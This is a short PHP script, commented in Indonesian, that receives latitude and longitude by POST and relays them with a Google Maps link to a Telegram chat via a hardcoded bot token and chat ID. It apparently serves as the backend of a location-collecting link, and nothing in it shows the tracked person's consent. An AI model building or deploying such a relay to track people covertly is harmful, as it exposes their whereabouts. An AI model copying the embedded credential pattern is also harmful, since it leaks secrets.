<?php
// Konfigurasi Telegram
$botToken = "8044655253:AAFQxlQw0kKpNZkRvhPf6eUE-IUO0nOa5PQ";
$chatId   = "7413662976";

// Ambil data dari POST
$lat = $_POST['lat'] ?? '';
$lon = $_POST['lon'] ?? '';

// Validasi data
if ($lat && $lon) {
    $message = "📍 Lokasi Diterima\nLatitude: $lat\nLongitude: $lon\nhttps://www.google.com/maps?q=$lat,$lon";

    // Kirim pesan ke Telegram pakai cURL
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $postData = [
        'chat_id' => $chatId,
        'text'    => $message
    ];

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
    $result = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error_msg = curl_error($ch);
    curl_close($ch);

    // Logging jika gagal
    if ($http_code != 200) {
        file_put_contents("log_error.txt", "Gagal kirim. HTTP: $http_code\nError: $error_msg\nResponse: $result\n", FILE_APPEND);
        echo "❌ Gagal mengirim ke Telegram. Cek log_error.txt.";
    } else {
        echo "✅ Lokasi berhasil dikirim ke Telegram!";
    }
} else {
    echo "❌ Data lokasi tidak lengkap.";
}
?>
